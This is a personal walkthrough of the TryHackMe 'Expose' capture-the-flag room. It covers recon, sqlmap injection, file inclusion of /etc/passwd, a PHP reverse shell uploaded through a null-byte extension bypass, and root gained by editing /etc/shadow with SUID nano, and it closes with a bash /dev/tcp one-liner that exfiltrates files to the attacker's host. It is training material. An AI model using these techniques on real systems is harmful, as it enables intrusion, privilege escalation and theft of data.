# Expose
**Completed 02/04/2024** 

https://tryhackme.com/room/expose

**Devices:** 
My Kali VM: 10.6.23.137 
Expose VM: 10.10.209.238 

**Flags:** 
1. /home/zeamkish/flag.txt: THM{USER_FLAG_1231_EXPOSE}
2. /root/flag.txt: THM{ROOT_EXPOSED_1001}

# **Recon**
## nmap 
- Ran `nmap -sT -p- 10.10.209.238` to check open ports
	- -p- checks all ports (1-65535)
- Found ports 21, 22, 53, 1337, and 1883 open
- Refining the scan with `nmap -sT -sV -p 21,22,53,1337,1883 10.10.209.238` reveals running services
- Port 1337/tcp is running an Apache web server
## gobuster
- Running `gobuster dir -u http://10.10.209.238:1337 -w /usr/share/wordlists/dirb/big.txt` gives initial URLs to check
- Found `/admin_101`, `/admin`, and `/phpmyadmin` from the scan

# **User Flag**
- Navigating to `http://10.10.209.238:1337/admin_101` reveals a login form with the email already filled in as `hacker@root.thm`
## SQL Injection
- The CTF specifically lists sqlmap as a provided tool, so let's check for SQLi vulnerabilities
- We submit a random password and capture the request in Burp Suite for analysis
- Right click > Save item, save in challenge folder as `req` (or any other name)
### sqlmap
- Run `sqlmap -r req --dump` to automatically run a scan using info from the request itself
- Say yes to limiting tests to MySQL-specific ones only
- When a hashed password is found, say yes to brute forcing it, revealing the password `easytohack`
- ASCII tables will be output near the end showing the located information from the SQLi attacks
- `/file1010111/index.php` uses `easytohack` as its password
- `/upload-cv00101011/index.php` requires a username starting with Z
## Query Parameter Injection
- Upon visiting `/file1010111/index.php` we are told to fuzz for parameters
- Checking the page source, there is a hint to use `file` or `view` as GET parameters
- If we add `?file=/etc/passwd` to the end of the URL, the contents are output on the page, revealing a user named `zeamkish`
- We can now go to `/upload-cv00101011/index.php` and provide the password of `zeamkish`
## PHP Reverse Shell
### Uploading the reverse shell
- There is a file upload prompt, and checking the page source reveals that only .png and .jpg files are accepted. We want a PHP Reverse Shell, so it's time to experiment
- Uploading a normal .png file leads to a page telling us to check the page source for the location that it was uploaded to, which is provided as `/upload_thm_1001`
- Navigating to `/upload-cv00101011/upload_thm_1001` reveals a file tree including the uploaded image, which we can view
- Next, I made a copy of `/usr/share/webshells/php/php_reverse_shell.php` (PHP Reverse Shell) in my CTF directory, and renamed it to `shell.phpD.png`
	- I set the target IP to my own and the port to 53 since it is unlikely to be blocked by outbound firewalls
	- I chose the file for upload, set Burp Suite proxy to intercept, and clicked the upload button
	- With the request in Burp Suite, I replaced the 'D' in the file name with a null byte (hex 00, ignoring the .png afterwards), and forwarded the request along
	- The file uploads successfully, and it is visible in `/upload_thm_1001`
### Using the reverse shell
- I set up a listener with `nc -lvnp 53`, then clicked on the `shell.php` file on the page
	- The reverse shell runs and netcat catches the connection, giving us shell access
	- I ran `python3 -c 'import pty; pty.spawn("/bin/bash")'`, upgrading to a better shell environment
	- Running `whoami` reveals that I am currently the www-data user
## Getting the flag
- `ls /home/zeamkish` reveals two files: `flag.txt` and `ssh_cred.txt`
- flag.txt is inaccessible to this user, but ssh_cred.txt reveals the SSH password for zeamkish is `easytohack@123`
- With credentials in hand, I ran `ssh zeamkish@10.10.209.238` and logged into the zeamkish user account
    - `cat flag.txt` reveals the first flag, THM{USER_FLAG_1231_EXPOSE}
    
# **Root Flag**
## Privilege Escalation
- The only remaining flag is the root flag, so privilege escalation is necessary
    - `find / -perm -04000 -type f -ls 2>/dev/null` reveals programs that have their SUID set in useful ways
    - nano is in the list, which means we can both read _and write_ files with root privileges
    - I used `nano /etc/shadow` to check that I could edit a file outside of zeamkish's privileges, and it opened successfully
### Injecting a new password hash
- A rather aggressive method if privilege escalation in this case is to use openssl to create a new salted root password and insert it into `/etc/shadow`
    - Running `openssl passwd -1 -salt root 1234` outputs `$1$root$.fAWE/htZAqQge.bvM16O/`
    - We can use nano to open the shadow file again, replacing everything after "root:" and before ":xxxxx:0:xxxxx:x ::::" with the new value
- The root user now has the password `1234`, so we can login easily
    - I ran `su root` and entered the new password, logging in successfully
    - I was now under `/root/` and could use `cat flag.txt` to reveal the final flag, THM{ROOT_EXPOSED_1001}


# **Lessons Learned**
- Use `-p-` and different scan modes with nmap to ensure all relevant ports are located
    - I did not find port 1337 initially, which led me on a useless path trying to do something with FTP on port 21
    - Remember to also use `-sV` with specific ports of interest afterwards to enumerate running services
     - 
- Remember to use gobuster or other directory enumeration tools to check subdirectories after the root scan
    - May not find much of interest, may add tons of useful info
    - 
- Using Burp Suite to intercept all kinds of requests can come in handy
    - At the very least, it allows requests to be analyzed for anything unusual or exploitable
    - A saved request can be used to run sqlmap extremely easily
    - If a file uploader only accepts certain file extensions and we want to upload a malicious payload, name the file as `<name>`.`<invalid_ext>`X`valid_ext` (i.e. `shell.phpX.png`), intercept the HTTP POST request, set the X to a null byte (hex code 00), then forward it
	 - 
	
- Use [gtfobins](https://gtfobins.github.io/) to find privilege escalation vectors
    - Base searches off of output of `find / -perm -04000 -type f -ls 2>/dev/null`
    - If nano is in that list, you get the power to change anything you want
	- 
- Basic data exfiltration can be done through Bash
    - Set up a listener on port 80 with `nc -lvnp 80 > FILENAME` on the local machine (or proxy, whatever you have access to for exfiltration)
    - Run `bash -c 'echo -e "POST / HTTP/0.9\n\n$(<flag.txt)" > /dev/tcp/RHOST/RPORT` on the compromised machine
	    - (`RHOST` = 10.6.23.137 and `RPORT` = 80 in this case)
    - The target will send the file data as the body of an HTTP POST request, which your netcat listener receives and outputs to a new local file